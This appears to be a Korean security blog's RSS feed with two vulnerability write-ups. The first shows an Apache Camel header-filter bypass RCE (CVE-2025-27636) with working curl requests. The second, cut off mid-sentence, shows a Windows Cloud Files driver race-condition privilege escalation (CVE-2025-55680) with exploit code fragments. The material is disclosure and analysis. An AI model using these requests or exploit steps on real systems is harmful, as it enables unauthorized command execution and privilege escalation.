<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sat, 29 Nov 2025 00:29:16 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-27636 : Apache Camel의 Case-Sensitive Header Filtering Bypass로 인한 RCE</title>
      <link>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/</link>
      <guid>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/</guid>
      <pubDate>Wed, 26 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.akamai.com/blog/security-res</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations"><strong>https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations</strong></a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><ul><li>Apache Camel 4.10.0 &#x2264; 4.10.1</li><li>Apache Camel 4.8.0 &#x2264; 4.8.4</li><li>Apache Camel 3.10.0 &#x2264; 3.22.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Apache Camel&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4; &#xAC04;&#xC758; &#xC6D0;&#xD65C;&#xD55C; &#xB370;&#xC774;&#xD130; &#xAD50;&#xD658;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xBA70; &#xAD11;&#xBC94;&#xC704;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD1B5;&#xD569; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. </p><p>Apache Camel&#xC740; DefaultHeaderFilterStrategy.java&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB0B4;&#xBD80; &#xD5E4;&#xB354;(CamelHttpResponseCode, CamelHttpUri, CamelContextId, org.apache.camel.* &#xB4F1;)&#xAC00; &#xC678;&#xBD80;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xC5EC; &#xBBFC;&#xAC10;&#xD55C; &#xB77C;&#xC6B0;&#xD305; &#xC815;&#xBCF4; &#xB204;&#xCD9C;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a><strong>Root Cause</strong></h3><p>Apache Camel&#xC758; &#xAE30;&#xBCF8; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC740; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xB294; &#xBC29;&#xC2DD;(case-sensitive)&#xC73C;&#xB85C;&#xB9CC; &#xC815;&#xD655;&#xD55C; &#xC77C;&#xCE58;&#xB97C; &#xAC80;&#xC0AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD544;&#xD130;&#xB9C1; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">header.startsWith(<span class="hljs-string">&quot;Camel&quot;</span>) || header.startsWith(<span class="hljs-string">&quot;camel&quot;</span>) || header.startsWith(<span class="hljs-string">&quot;org.apache.camel&quot;</span>)</code></pre><p>&#xADF8;&#xB7EC;&#xB098; &#xB2E4;&#xC6B4;&#xC2A4;&#xD2B8;&#xB9BC; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xD5E4;&#xB354;&#xB4E4;&#xC774; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD5E4;&#xB354;&#xC758; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xBA74;(&#xC608;: CAmelExecCommandExecutable, cAMELHttpResponseCode), &#xD544;&#xD130;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><strong>PoC</strong></h3><p>Akamai&#xB294; Camel&#xC758; Exec &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC0D8;&#xD50C; &#xCDE8;&#xC57D;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC81C;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; HTTP &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xB178;&#xCD9C;&#xD558;&#xACE0;, &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C;&#xB294; &#x201C;whoami&#x201D; &#xBA85;&#xB839;&#xC744; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">from(<span class="hljs-string">&quot;jetty:http://0.0.0.0:80/vulnerable&quot;</span>)    .log(<span class="hljs-string">&quot;Received request from client&quot;</span>)    <span class="hljs-comment">// define a static command. This can be overwritten using the &quot;CamelExecCommandExecutable&quot; header</span>    .to(<span class="hljs-string">&quot;exec:whoami&quot;</span>)     .convertBodyTo(String.class)     .log(<span class="hljs-string">&quot;Command Output: ${body}&quot;</span>);</code></pre><p>&#xBA85;&#xB839;&#xC774; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0;, CamelExecCommandExecutable &#xD5E4;&#xB354;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC7AC;&#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD5E4;&#xB354;&#xB294; Apache Camel <a href="https://camel.apache.org/security/">&#xACF5;&#xC2DD; &#xBB38;&#xC11C;</a>&#xC5D0; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC788;&#xB4EF;&#xC774; &#xC815;&#xC801; URI&#xB97C; &#xB36E;&#xC5B4;&#xC50C;&#xC6C1;&#xB2C8;&#xB2E4;. Apache Camel&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xD5E4;&#xB354;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xB300;&#xC18C;&#xBB38;&#xC790; &#xCC98;&#xB9AC; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#x201C;CAmelExecCommandExecutable&#x201D; &#xD5E4;&#xB354;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xD544;&#xD130;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC815;&#xC0C1; &#xC694;&#xCCAD;</strong></p><pre><code class="hljs python">$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CamelExecCommandExecutable: ls&quot;</span>kali</code></pre><p><strong>&#xC545;&#xC758;&#xC801; &#xC694;&#xCCAD; (&#xBA85;&#xB839; &#xBCC0;&#xACBD;)</strong></p><pre><code class="hljs bash">$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandExecutable: ls&quot;</span>pom.xmlsrctarget</code></pre><p><strong>&#xC545;&#xC758;&#xC801; &#xC694;&#xCCAD; (&#xBBFC;&#xAC10; &#xC815;&#xBCF4; &#xC720;&#xCD9C;)</strong></p><pre><code class="hljs bash">*$ curl <span class="hljs-string">&quot;http://localhost:80/vulnerable&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandExecutable: ping&quot;</span> --header <span class="hljs-string">&quot;CAmelExecCommandArgs: -c 2 8.8.8.8&quot;</span>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=98.9 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=128 time=46.4 ms--- 8.8.8.8 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1012ms<span class="hljs-comment"># &#xACB0;&#xACFC;: /etc/passwd &#xD30C;&#xC77C; &#xB0B4;&#xC6A9; &#xD45C;&#xC2DC;*</span></code></pre><p><code>CAmelExecCommandExecutable</code>&#xACFC; <code>CAmelExecCommandArgs</code> &#xD5E4;&#xB354;&#xB97C; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xACFC; &#xC778;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; ping &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xACB0;&#xACFC;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC131;&#xACF5;&#xC801; &#xC545;&#xC6A9; &#xC2DC;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC774; Camel &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xAD8C;&#xD55C;(&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <code>root</code>)&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>Apache&#xB294; DefaultHeaderFilterStrategy.java&#xC758; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC744; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xC5EC; <code>toLowerCase(Locale.ENGLISH)</code>&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD5E4;&#xB354; &#xC774;&#xB984;&#xC774; &#xD544;&#xD130; &#xC801;&#xC6A9; &#xC804;&#xC5D0; &#xC18C;&#xBB38;&#xC790;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">java*// &#xC218;&#xC815;&#xB41C; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;*String name = header.toLowerCase(Locale.ENGLISH);<span class="hljs-keyword">if</span> (name.startsWith(<span class="hljs-string">&quot;camel&quot;</span>) || name.startsWith(<span class="hljs-string">&quot;org.apache.camel&quot;</span>)) {    <span class="hljs-keyword">return</span> true; *// &#xD544;&#xD130;&#xB9C1;&#xB428;*}</code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, CAmelHttpUri&#xB294; camelhttpuri&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xC5B4; &#xD544;&#xD130; &#xC870;&#xAC74;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xBBC0;&#xB85C; &#xCC28;&#xB2E8;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC">https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Software-Foundation/">Apache Software Foundation</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Camel/">Apache Camel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Case-Sensitive-Header-Filtering-Bypass/">Case-Sensitive Header Filtering Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-27636/">CVE-2025-27636</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-55680: Windows Cloud Files 미니필터 드라이버(cldflt.sys)의 TOCTOU 레이스 컨디션을 통한 LPE 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/</link>
      <guid>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/</guid>
      <pubDate>Sat, 22 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ssd-disclosure.com/cloud-filter-arbitrary-f</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe">https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 10&#xC6D4; 14&#xC77C;&#xC790; Microsoft &#xC815;&#xAE30; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC801;&#xC6A9; &#xC774;&#xC804;&#xC758; Windows 10/11 &#xD658;&#xACBD;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-55680&#xC740; &#xC6D0;&#xB798; 2020&#xB144; Microsoft&#xAC00; &#xD328;&#xCE58;&#xD588;&#xB358; Arbitrary File Creation EoP &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C;, TOCTOU &#xB808;&#xC774;&#xC2A4; &#xC870;&#xAC74;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6B0;&#xD68C; &#xACF5;&#xACA9;&#xC774; &#xB2E4;&#xC2DC; &#xAC00;&#xB2A5;&#xD574;&#xC9C4; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows Cloud Files Mini Filter Driver&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )      {        v23 = *(_WORD *)((<span class="hljs-keyword">char</span> *)v52 + <span class="hljs-number">2</span> * v22 + epi16);        <span class="hljs-keyword">if</span> ( v23 == <span class="hljs-string">&apos;\\&apos;</span> || v23 == <span class="hljs-string">&apos;:&apos;</span> )          <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">if</span> ( ++v22 &gt;= (<span class="hljs-keyword">unsigned</span> __int16)(WORD1(v18) &gt;&gt; <span class="hljs-number">1</span>) )          <span class="hljs-keyword">goto</span> LABEL_51;      }</code></pre><p>&#xAE30;&#xC874;&#xC758; &#xAC80;&#xC0AC; &#xCF54;&#xB4DC;&#xB294; &#xACBD;&#xB85C;&#xC5D0; <code>\</code>&#xD639;&#xC740; <code>:</code>&#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0;, &#xACBD;&#xB85C;&#xC5D0; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xD30C;&#xC77C; &#xC0DD;&#xC131;&#xC774; &#xCC28;&#xB2E8;&#xB418;&#xB294; &#xD750;&#xB984;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">ProbeForRead(a4, Length, <span class="hljs-number">4u</span>);  MmProbeAndLockPages(MemoryDescriptorList, <span class="hljs-number">1</span>, IoReadAccess);  <span class="hljs-keyword">if</span> ( (MemoryDescriptorList-&gt;MdlFlags &amp; <span class="hljs-number">5</span>) != <span class="hljs-number">0</span> )    MappedSystemVa = (<span class="hljs-keyword">char</span> *)MemoryDescriptorList-&gt;MappedSystemVa;  <span class="hljs-keyword">else</span>    MappedSystemVa = (<span class="hljs-keyword">char</span> *)MmMapLockedPagesSpecifyCache(MemoryDescriptorList, <span class="hljs-number">0</span>, MmCached, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>, <span class="hljs-number">0x40000010</span>u);  v46 = MappedSystemVa;</code></pre><p><code>ProbeForRead</code>&#xC640; <code>MmProbeAndLockPages</code>&#xB85C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB77D;(lock)&#xD55C; &#xD6C4; &#xBB38;&#xC790;&#xC5F4; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xACE0;&#xC815;&#xD560; &#xBFD0; &#xB0B4;&#xC6A9; &#xC790;&#xCCB4;&#xB97C; &#xB3D9;&#xACB0;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xB294; &#xC5EC;&#xC804;&#xD788; UserMode&#xC5D0;&#xC11C;&#xB3C4; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xACE0;, &#xCEE4;&#xB110;&#xC774; &#xBB38;&#xC790;&#xC5F4; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD55C; &#xC9C1;&#xD6C4;&#xB098; &#xAC80;&#xC99D;&#xACFC; &#xC2E4;&#xC81C; &#xC0AC;&#xC6A9; &#xC0AC;&#xC774; &#xD0C0;&#xC774;&#xBC0D;&#xC5D0; &#xAC12;&#xC774; &#xBC14;&#xB014; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xAC80;&#xC0AC; &#xC2DC;&#xC810;&#xC5D0;&#xB294; &#xC815;&#xC0C1;&#xC73C;&#xB85C; &#xBCF4;&#xC600;&#xB358; &#xACBD;&#xB85C;&#xAC00; &#xC0AC;&#xC6A9; &#xC2DC;&#xC810;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xAC12;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xB294; TOCTOU &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><pre><code class="hljs cpp">DoStartSvc();_mkdir(<span class="hljs-string">&quot;C:\\ProgramData\\cldpwn&quot;</span>);_mkdir(<span class="hljs-string">&quot;C:\\ProgramData\\cldpwn\\boo&quot;</span>);HRESULT hr = CfRegisterSyncRoot(dir, &amp;reg, &amp;policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);init_symlink();</code></pre><p>&#xBA3C;&#xC800; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xB3C4;&#xB85D; &#xAD00;&#xB828; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC2DC;&#xC791;&#xD55C; &#xB4A4;, &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC784;&#xC758;&#xC758; &#xACBD;&#xB85C;(<code>C:\ProgramData\cldpwn</code> &#xBC0F; &#xADF8; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;)&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; Windows Cloud Filter Sync Root&#xB85C; &#xB4F1;&#xB85D;&#xD574;, &#xD574;&#xB2F9; &#xACBD;&#xB85C; &#xC544;&#xB798;&#xC758; &#xD30C;&#xC77C; &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC774; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xBC18;&#xB4DC;&#xC2DC; &#xAC70;&#xCE58;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. (<a href="https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/">&#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; Sync Root</a> &#x1F448;)</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> path[] = <span class="hljs-string">L&quot;boo16.txt&quot;</span>;createthread test = (createthread)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;RtlCreateUserThread&quot;</span>);HANDLE a;<span class="hljs-keyword">char</span> buffer11[<span class="hljs-number">0x100</span>];*(WORD*)(tmp + <span class="hljs-number">0x8</span>) = <span class="hljs-number">0x100</span>;*(WORD*)(tmp + <span class="hljs-number">0xa</span>) = (lstrlenW(path)) * <span class="hljs-number">2</span>;*(WORD*)(tmp + <span class="hljs-number">0xc</span>) = <span class="hljs-number">0x20</span>;*(WORD*)(tmp + <span class="hljs-number">0xe</span>) = <span class="hljs-number">0x30</span>;<span class="hljs-built_in">memcpy</span>(tmp + <span class="hljs-number">0x100</span>, path, (lstrlenW(path) + <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>);    ...*(<span class="hljs-keyword">int</span>*)inbuffer = <span class="hljs-number">0x9000001A</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">4</span>) = <span class="hljs-number">0xC0000001</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">16</span>) = <span class="hljs-number">0x200</span>;*(<span class="hljs-keyword">char</span>**)(inbuffer + <span class="hljs-number">24</span>) = tmp;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        *(<span class="hljs-keyword">char</span>*)(tmp + <span class="hljs-number">0x106</span>) = <span class="hljs-number">0x31</span>;        *(<span class="hljs-keyword">char</span>*)(tmp + <span class="hljs-number">0x11a</span>) = <span class="hljs-number">0x31</span>;        DeviceIoControl(dir_handle, <span class="hljs-number">0x903BC</span>, inbuffer, <span class="hljs-number">0x98</span>, outbuffer, <span class="hljs-number">0x1000</span>, &amp;BytesReturned, <span class="hljs-number">0</span>);    }</code></pre><p>&#xC774;&#xD6C4; <code>dir_handle</code>&#xC5D0; &#xB300;&#xD574; IOCTL(<code>0x903BC</code>)&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xBA74;&#xC11C;, <code>boo16.txt</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; placeholder &#xD30C;&#xC77C;&#xC744; &#xACC4;&#xC18D; &#xC0DD;&#xC131;&#xD558;&#xB3C4;&#xB85D; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>inbuffer</code>&#xC758; &#xCCAB; &#xD544;&#xB4DC; <code>0x9000001A</code>&#xC640; &#xC0C1;&#xD0DC; &#xCF54;&#xB4DC; <code>0xC0000001</code>, <code>0xC0000007</code>&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; <code>HsmpOpCreatePlaceholders</code>&#xB85C; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xC694;&#xCCAD; &#xD0C0;&#xC785;&#xACFC; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xD574;&#xC11D;&#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xC774; &#xB8E8;&#xD504;&#xB97C; &#xD1B5;&#xD574; <code>C:\ProgramData\cldpwn</code> &#xC544;&#xB798;&#xC5D0;&#xC11C; placdholder &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC744; &#xD3ED;&#xBC1C;&#xC801;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xD2B8;&#xB9AC;&#xAC70; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xC774; &#xC2DC;&#xC810;&#xC758; &#xC785;&#xB825; &#xBC84;&#xD37C; <code>tmp</code>&#xAC00; &#xC774;&#xD6C4; TOCTOU &#xB808;&#xC774;&#xC2A4;&#xC758; &#xD0C0;&#xAC9F;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">thread1</span><span class="hljs-params">()</span> </span>{  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {    Sleep(<span class="hljs-number">5</span>);    *(<span class="hljs-keyword">char</span> *)(tmp + <span class="hljs-number">0x106</span>) = <span class="hljs-number">0x5c</span>;  }}</code></pre><p>&#xACC4;&#xC18D; <code>boo16.txt</code>&#xC5D0; &#xB300;&#xD574; placeholder &#xD30C;&#xC77C; &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xB3D9;&#xC548;, <code>thread1()</code>&#xC5D0;&#xC11C;&#xB294; &#xB3D9;&#xC77C; &#xBC84;&#xD37C; <code>tmp</code>&#xB97C; &#xD2B9;&#xC815; &#xBC14;&#xC774;&#xD2B8;&#xB97C; <code>0x31(&apos;1&apos;)</code>&#xC5D0;&#xC11C; <code>0x5c(&apos;\\&apos;)</code>&#xB85C; &#xB36E;&#xC5B4; &#xACBD;&#xB85C; &#xBB38;&#xC790;&#xC5F4; &#xC77C;&#xBD80;&#xB97C; &#xC21C;&#xAC04;&#xC801;&#xC73C;&#xB85C; <code>boo\\6.txt</code> &#xD615;&#xD0DC;&#xAC00; &#xB418;&#xB3C4;&#xB85D; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xACBD;&#xB85C; &#xAC80;&#xC0AC; &#xB8E8;&#xD2F4;&#xC740; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC12;&#xC77C; &#xB54C; &#xC548;&#xC804;&#xD55C; <code>boo16.txt</code> &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xC9C0;&#xB9CC;, &#xAC80;&#xC0AC; 